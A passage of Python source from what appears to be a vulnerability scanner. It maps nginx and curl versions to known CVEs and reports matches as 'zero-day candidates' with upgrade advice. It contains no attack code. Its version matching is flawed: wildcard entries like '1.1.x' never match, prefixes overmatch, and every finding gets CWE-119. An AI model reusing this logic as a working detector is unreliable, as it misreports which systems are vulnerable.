             "desc": "Path traversal and file disclosure via crafted request"},
        ],
        "nginx": [
            {"affected": ["1.1.x", "1.17.x"],
             "cve": "CVE-2021-23017", "name": "DNS Resolver Off-by-One", "severity": "high",
             "desc": "Off-by-one in DNS resolver allowing memory disclosure"},
        ],
        "curl": [
            {"affected": ["8.0", "8.1", "8.2", "8.3"],
             "cve": "CVE-2023-38545", "name": "SOCKS5 Heap Overflow", "severity": "critical",
             "desc": "Heap buffer overflow in SOCKS5 proxy handshake"},
        ],
    }

    @classmethod
    def check(cls, service: str, version: str) -> list[ZeroDayCandidate]:
        """Check a service version against the regression database."""
        candidates = []
        service_key = service.lower().replace("-", "").replace("_", "")

        for svc_name, regressions in cls.REGRESSION_DB.items():
            if svc_name not in service_key and service_key not in svc_name:
                continue
            for reg in regressions:
                for affected_ver in reg["affected"]:
                    if version.startswith(affected_ver) or version == affected_ver:
                        candidates.append(ZeroDayCandidate(
                            target="", category="version_regression",
                            confidence=0.95, severity=reg["severity"],
                            description=f"{reg['name']}: {reg['desc']} ({reg['cve']})",
                            evidence={"service": service, "version": version,
                                      "cve": reg["cve"], "affected_range": reg["affected"][:3]},
                            remediation=f"Upgrade {service} immediately. Patch for {reg['cve']}.",
                            cwe_id="CWE-119", technique="version_regression",
                        ))
        return candidates

